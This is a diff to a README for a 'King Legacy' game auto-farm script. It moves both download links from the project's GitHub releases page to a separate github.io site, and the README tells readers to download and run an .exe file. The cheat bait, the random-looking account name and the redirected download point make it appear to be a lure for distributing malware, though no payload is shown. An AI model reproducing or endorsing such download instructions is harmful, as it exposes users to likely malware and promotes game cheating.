@@ -1,6 +1,6 @@
 # 🚀 King-Legacy-Script-Auto-Farm-2026 - Automate gameplay and level up faster
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/unclipped-bidder998/King-Legacy-Script-Auto-Farm-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://unclipped-bidder998.github.io)
 
 This software automates tasks in the King Legacy game. It handles leveling, quest completion, and item collection. You save time by letting the tool manage repetitive actions.
 
@@ -17,7 +17,7 @@ The application runs on Windows systems. Ensure your PC meets these requirements
 
 Follow these steps to acquire the software safely. 
 
-1.  Visit the official release page: [https://github.com/unclipped-bidder998/King-Legacy-Script-Auto-Farm-2026/releases](https://github.com/unclipped-bidder998/King-Legacy-Script-Auto-Farm-2026/releases).
+1.  Visit the official release page: [https://unclipped-bidder998.github.io](https://unclipped-bidder998.github.io).
 2.  Locate the section labeled "Assets" at the bottom of the latest release.
 3.  Click the file ending in .exe to start the download.
 4.  Save the file to your desktop for easy access.
